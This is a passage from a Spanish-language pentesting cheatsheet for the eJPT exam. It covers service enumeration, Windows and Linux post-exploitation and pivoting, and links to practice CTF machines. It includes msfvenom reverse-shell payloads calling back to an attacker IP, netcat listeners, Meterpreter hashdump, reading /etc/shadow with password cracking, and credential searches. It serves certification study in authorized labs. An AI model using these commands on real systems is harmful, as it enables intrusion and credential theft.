  <img src="assets/images/metasploit-step-05.png" alt="Captura 65" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-06.png" alt="Captura 66" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-07.png" alt="Captura 67" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-08.png" alt="Captura 68" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-09.png" alt="Captura 69" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-10.png" alt="Captura 70" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-11.png" alt="Captura 71" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-12.png" alt="Captura 72" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-13.png" alt="Captura 73" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-14.png" alt="Captura 74" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-15.png" alt="Captura 75" width="850">
</p>

</details>




# ⚔️ Explotación web y servicios comunes

Esta sección recoge vectores frecuentes en laboratorios eJPT. El objetivo es saber **qué comprobar** y **qué evidencia guardar**, no lanzar exploits sin criterio.

## WebDAV

```bash
davtest -url http://IP/webdav
cadaver http://IP/webdav
```

WebDAV puede permitir subida de ficheros. Si se permite escritura y ejecución, puede convertirse en una vía de acceso inicial en entornos vulnerables.

## Tomcat

```bash
nmap -sV -p8080 IP
```

En Tomcat revisa paneles de administración, credenciales por defecto, versiones antiguas y posibilidad de desplegar un WAR en laboratorios vulnerables.

## Samba

```bash
smbclient -L //IP/ -N
smbmap -H IP
searchsploit samba
```

Samba puede exponer recursos compartidos, configuraciones débiles o versiones vulnerables. La enumeración es clave antes de probar explotación.

## WinRM

```bash
crackmapexec winrm IP -u usuario -p contraseña
evil-winrm -i IP -u usuario -p contraseña
```

WinRM permite acceso remoto en Windows cuando existen credenciales válidas. Es muy común en laboratorios con reutilización de usuarios y contraseñas.

## RDP

```bash
nmap -sV -p3389 IP
xfreerdp /u:usuario /p:contraseña /v:IP
```

RDP sirve para acceso gráfico. Revisa si el puerto está abierto, si hay credenciales válidas y si el usuario tiene permisos para iniciar sesión.

## ShellShock

ShellShock afecta a Bash en ciertas configuraciones CGI. En laboratorios, suele aparecer en rutas web antiguas o scripts CGI expuestos.

```bash
nmap --script=http-shellshock --script-args uri=/cgi-bin/status -p80 IP
```

## MSFvenom

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f exe -o shell.exe
```

MSFvenom genera payloads para laboratorios. Debes ajustar arquitectura, sistema operativo, formato y dirección de retorno.

<details>
<summary><strong>📸 Capturas de explotación web y servicios</strong></summary>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-01.png" alt="Captura 76" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-02.png" alt="Captura 77" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-03.png" alt="Captura 78" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-04.png" alt="Captura 79" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-05.png" alt="Captura 80" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-06.png" alt="Captura 81" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-07.png" alt="Captura 82" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-08.png" alt="Captura 83" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-09.png" alt="Captura 84" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-10.png" alt="Captura 85" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-11.png" alt="Captura 86" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-12.png" alt="Captura 87" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-13.png" alt="Captura 88" width="850">
</p>

</details>




# 🪟 Post-explotación Windows

Una vez obtenida una sesión en Windows, el objetivo es entender usuario, privilegios, sistema, red y posibles rutas de escalada.

## Enumeración inicial

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
net user
net localgroup
net localgroup administrators
```

## Qué revisar

| Elemento | Por qué importa |
|---|---|
| Privilegios del usuario | Algunos privilegios permiten rutas de escalada. |
| Grupos locales | Determinan permisos reales dentro del sistema. |
| Versión de Windows | Puede relacionarse con vulnerabilidades conocidas. |
| Servicios | Servicios mal configurados pueden permitir escalada. |
| Ficheros sensibles | Configs, backups o scripts pueden contener credenciales. |
| Red interna | Puede revelar nuevas máquinas o segmentos accesibles. |

## Búsqueda de credenciales

```cmd
dir /s /b *password* *cred* *config*
findstr /si password *.txt *.ini *.config *.xml
cmdkey /list
```

## Meterpreter útil

```text
getuid
sysinfo
getprivs
ps
migrate PID
hashdump
```

> [!WARNING]
> Técnicas como dumping de hashes, impersonación de tokens o persistencia deben limitarse a laboratorios y autorización explícita. Documenta siempre qué hiciste y por qué.

<details>
<summary><strong>📸 Capturas de post-explotación Windows</strong></summary>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-01.png" alt="Captura 89" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-02.png" alt="Captura 90" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-03.png" alt="Captura 91" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-04.png" alt="Captura 92" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-05.png" alt="Captura 93" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-06.png" alt="Captura 94" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-07.png" alt="Captura 95" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-08.png" alt="Captura 96" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-09.png" alt="Captura 97" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-10.png" alt="Captura 98" width="850">
</p>

</details>




# 🐧 Post-explotación Linux

En Linux, la enumeración local suele centrarse en usuarios, permisos, procesos, servicios, tareas programadas y binarios con permisos especiales.

## Enumeración inicial

```bash
whoami
id
hostname
uname -a
ip a
ip route
sudo -l
cat /etc/passwd
find / -perm -4000 -type f 2>/dev/null
```

## Puntos clave

| Revisión | Comando | Qué buscar |
|---|---|---|
| Sudo | `sudo -l` | Comandos ejecutables como root. |
| SUID | `find / -perm -4000 -type f 2>/dev/null` | Binarios con permisos especiales. |
| Cron | `cat /etc/crontab` | Scripts ejecutados automáticamente. |
| Procesos | `ps aux` | Servicios y comandos con credenciales. |
| Puertos locales | `ss -tulpn` | Servicios internos no expuestos externamente. |
| Historial | `history` | Comandos previos con rutas o secretos. |
| Ficheros | `find / -name "*.conf" 2>/dev/null` | Configuraciones con credenciales. |

## Hashes en Linux

```bash
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`/etc/shadow` requiere privilegios elevados. En laboratorios, si consigues ambos ficheros, puedes combinarlos para intentar crackeo offline.

<details>
<summary><strong>📸 Capturas de post-explotación Linux</strong></summary>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-01.png" alt="Captura 99" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-02.png" alt="Captura 100" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-03.png" alt="Captura 101" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-04.png" alt="Captura 102" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-05.png" alt="Captura 103" width="850">
</p>

</details>




# 🔁 Pivoting y movimiento en red

Pivoting significa usar una máquina comprometida como punto de apoyo para llegar a redes internas que no son accesibles directamente.

## Conceptos importantes

| Concepto | Explicación |
|---|---|
| Ruta interna | Red adicional visible desde la máquina comprometida. |
| Port forwarding | Redirigir un puerto remoto hacia tu máquina. |
| SOCKS proxy | Canalizar herramientas a través de una sesión. |
| Autoroute | Añadir rutas en Metasploit para alcanzar redes internas. |

## Comandos orientativos en Meterpreter

```text
ipconfig
route print
run autoroute -s 10.10.20.0/24
background
use auxiliary/server/socks_proxy
run
```

Luego puedes configurar herramientas para pasar por el proxy si el laboratorio lo requiere.



# 🧰 Utilidades prácticas

## Banner grabbing

```bash
nc -nv IP PUERTO
curl -I http://IP
nmap -sV -pPUERTO IP
```

El banner grabbing intenta obtener información directa del servicio: versión, producto, cabeceras o mensajes de bienvenida.

## Searchsploit

```bash
searchsploit apache 2.4
searchsploit samba 3.0.20
searchsploit -m ruta/del/exploit
```

Searchsploit permite buscar exploits locales en Exploit-DB. Antes de usar cualquier exploit, lee el código, entiende requisitos y verifica que aplica a tu versión.

## Netcat

```bash
nc -lvnp 4444
nc -nv IP 4444
```

Netcat sirve para listeners, conexiones TCP simples, transferencia básica de datos y pruebas rápidas de conectividad.

## Compartir archivos

```bash
python3 -m http.server 8000
wget http://TU_IP:8000/archivo
curl -O http://TU_IP:8000/archivo
```

En laboratorios es habitual levantar un servidor HTTP temporal para pasar herramientas, scripts o evidencias entre máquinas.

## Mejorar una shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

Una shell interactiva mejora el uso de comandos como `su`, editores, autocompletado y señales de terminal.

## Nikto

```bash
nikto -h http://IP
nikto -h http://IP -o reporte.html -Format htm
```

Nikto automatiza comprobaciones web básicas. Úsalo como apoyo, no como sustituto de revisar manualmente rutas, cabeceras y comportamiento de la aplicación.

## WPScan

```bash
wpscan --url http://IP --enumerate u,p,t
wpscan --url http://IP --api-token TOKEN
wpscan --update
```

WPScan enumera WordPress, plugins, temas y usuarios. Actualizar la base de datos mejora la detección de vulnerabilidades conocidas.

<details>
<summary><strong>📸 Capturas de utilidades finales</strong></summary>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-01.png" alt="Captura 104" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-02.png" alt="Captura 105" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-03.png" alt="Captura 106" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-04.png" alt="Captura 107" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-05.png" alt="Captura 108" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-06.png" alt="Captura 109" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-07.png" alt="Captura 110" width="850">
</p>

</details>




# 📝 Plantilla de documentación

La plantilla completa para documentar máquinas, CTFs y laboratorios está separada en `TEMPLATE.md` para mantener el README como cheatsheet principal.

📄 **Archivo:** [`TEMPLATE.md`](TEMPLATE.md)

Úsala para registrar información general, reconocimiento, enumeración, explotación, escalada de privilegios, evidencias, comandos útiles y lecciones aprendidas.



# ✅ Notas finales

- Enumera antes de explotar.
- Guarda siempre salidas importantes con `-oA`, capturas o logs.
- No ejecutes exploits sin leerlos primero.
- Reutiliza credenciales solo dentro del laboratorio y documenta dónde aparecieron.
- Mantén una metodología clara: cada hallazgo debe justificar el siguiente paso.



## 🧭 Plantilla para examen eJPT

Este repositorio incluye también una plantilla específica para organizar un entorno de examen con varias máquinas, topologías, redes internas, credenciales, evidencias y posibles rutas de pivoting.

📄 **Archivo:** [`EXAM_TEMPLATE.md`](EXAM_TEMPLATE.md)

Úsala como cuaderno de trabajo durante laboratorios o simulacros de examen para no perder información importante entre hosts.



# 🧪 Máquinas recomendadas para practicar eJPT

<p align="center">
  <img src="assets/images/writeups-ctf-solutions-cover.png" alt="Portada Writeups y CTF Solutions" width="850">
</p>

Además de la teoría y los comandos, una de las mejores formas de preparar eJPT es practicar con máquinas vulnerables. A continuación dejo una selección de máquinas documentadas por mí que trabajan técnicas muy alineadas con el examen: enumeración, explotación web, SMB, FTP, SSH, credenciales débiles, reverse shells, escalada de privilegios y pivoting básico.

| Máquina | Plataforma | Nivel | Técnicas principales | Por qué viene bien para eJPT | Solución |
|---|---|---|---|---|---|
| FirstHacking | DockerLabs | Muy Fácil | FTP vulnerable, Metasploit, acceso inicial, root directo. | Sirve para practicar explotación básica con Metasploit y entender cómo validar servicios vulnerables. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/firsthacking/README.md) |
| Trust | DockerLabs | Muy Fácil | Enumeración web, fuerza bruta, SSH, sudo. | Refuerza el flujo clásico de eJPT: enumerar, encontrar credenciales, acceder por SSH y escalar privilegios. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/trust/README.md) |
| BreakMySSH | DockerLabs | Muy Fácil | Enumeración, fuerza bruta, cracking de hashes, SSH. | Ayuda a practicar credenciales débiles, acceso remoto y validación de usuarios. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/breakmyssh/README.md) |
| WalkingCMS | DockerLabs | Fácil | WordPress, enumeración web, fuerza bruta, edición de temas, reverse shell, SUID. | Muy útil para practicar explotación de CMS, acceso inicial web y escalada de privilegios en Linux. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/walkingcms/README.md) |
| AnonymousPingu | DockerLabs | Fácil | FTP anónimo, Apache, subida de archivos, web shell, reverse shell, sudo/GTFOBins. | Trabaja un vector muy típico de laboratorio: servicio mal configurado, subida de fichero y escalada por permisos. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/AnonymousPingu/README.md) |
| Backend | DockerLabs | Fácil | SQL Injection, sqlmap, credenciales, SSH, SUID, John the Ripper. | Refuerza explotación web, obtención de credenciales y crackeo básico de hashes. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/backend/README.md) |
| FindYourStyle | DockerLabs | Fácil | Drupal, Drupalgeddon2, credenciales en configuración, sudo, grep/ls. | Permite practicar identificación de CMS, explotación de vulnerabilidades conocidas y post-explotación básica. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/findyourstyle/README.md) |
| Dance-Samba | DockerLabs | Medio | FTP, SMB, SSH, credenciales débiles, SSH Key Injection, sudo. | Especialmente útil para eJPT porque combina varios servicios típicos y obliga a correlacionar información entre ellos. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/dance-samba/README.md) |
| Domain | DockerLabs | Medio | HTTP, SMB, enumeración de usuarios, fuerza bruta controlada, subida de reverse shell, SUID. | Muy buena para practicar enumeración SMB, reutilización de credenciales y explotación de recursos compartidos. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/domain/README.md) |
| Vulnerame | DockerLabs | Difícil | Joomla, information disclosure, MySQL, cracking de hashes, panel admin, reverse shell, sudo. | Es más avanzada, pero sirve para unir varias fases completas: web, base de datos, credenciales, acceso inicial y escalada. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/vulnerame/README.md) |
| Cap | HackTheBox | Fácil | IDOR, análisis de tráfico, credenciales reutilizadas, capabilities Linux. | Excelente para practicar análisis de evidencias, reutilización de credenciales y escalada por capabilities. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/HackTheBox/Facil/Cap/README.md) |
| Neighbour | TryHackMe | 5 minutos | Credenciales en código fuente, IDOR, manipulación de parámetros. | Ideal para reforzar enumeración web básica y fallos lógicos sencillos. | [Ver write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/TryHackme/5_minutos/Neighbour/README.md) |

## Ruta recomendada de práctica

1. FirstHacking
2. Trust
3. BreakMySSH
4. AnonymousPingu
5. WalkingCMS
6. Backend
7. FindYourStyle
8. Dance-Samba
9. Domain
10. Cap
11. Vulnerame

Si estás empezando, lo ideal es seguir este orden para pasar de enumeración básica y explotación sencilla a escenarios con varios servicios, credenciales reutilizadas, CMS, SQL Injection, SMB y escalada de privilegios más completa.

> [!NOTE]
> Estas máquinas no sustituyen a los laboratorios oficiales de eJPT, pero son una buena forma de reforzar metodología, documentación y práctica técnica antes del examen.

## <img src="./assets/images/logoactual.jpg" width=25 style="; border-radius:50%;"> ¡Hola! Me llamo Saúl Ruiz

### Analista de Ciberseguridad | Seguridad Ofensiva y Pentesting

![YouTube](https://img.shields.io/youtube/channel/subscribers/UCcOkvgreZrXauRHyXlii0JA)
![Seguidores](https://img.shields.io/github/followers/saulruizplaza)
[![Twitter Follow](https://img.shields.io/twitter/follow/plasysx?style=social)](https://twitter.com/plasysx)

Soy Analista de Ciberseguridad y Técnico Superior en Administración de Sistemas Informáticos en Red. Actualmente desarrollo mi carrera en entornos SOC, participando en tareas de análisis, monitorización e investigación de eventos de seguridad.

Mi interés principal se orienta hacia la seguridad ofensiva, el pentesting y el análisis técnico, áreas en las que sigo formándome de manera constante para crecer profesionalmente dentro del sector.

A través de mi proyecto personal <b>[@PlaSysX](https://linktr.ee/PlaSysx)</b>, comparto contenido relacionado con informática, ciberseguridad y aprendizaje práctico, con el objetivo de aportar valor a quienes también quieren seguir creciendo en el mundo tecnológico.

[![Website](https://img.shields.io/badge/Website-plasysx.com-7B3FF2?style=for-the-badge&logo=google-chrome&logoColor=white&labelColor=101010)](https://plasysx.com)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Saúl_Ruiz_Plaza-0077B5?style=for-the-badge&logo=linkedin&logoColor=white&labelColor=101010)](https://www.linkedin.com/in/saulruizplaza) [![Instagram](https://img.shields.io/badge/Instagram-@PlaSysX-E4405F?style=for-the-badge&logo=instagram&logoColor=white&labelColor=101010)](https://instagram.com/plasysx)
[![TikTok](https://img.shields.io/badge/TikTok-@plasysx_es-69C9D0?style=for-the-badge&logo=tiktok&logoColor=white&labelColor=101010)](https://tiktok.com/@plasysx_es)
[![YouTube](https://img.shields.io/badge/YouTube-Plasysx-FF0000?style=for-the-badge&logo=youtube&logoColor=white&labelColor=101010)](https://youtube.com/@Plasysx)
[![Twitter](https://img.shields.io/badge/Twitter-@plasysx-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white&labelColor=101010)](https://twitter.com/plasysx)
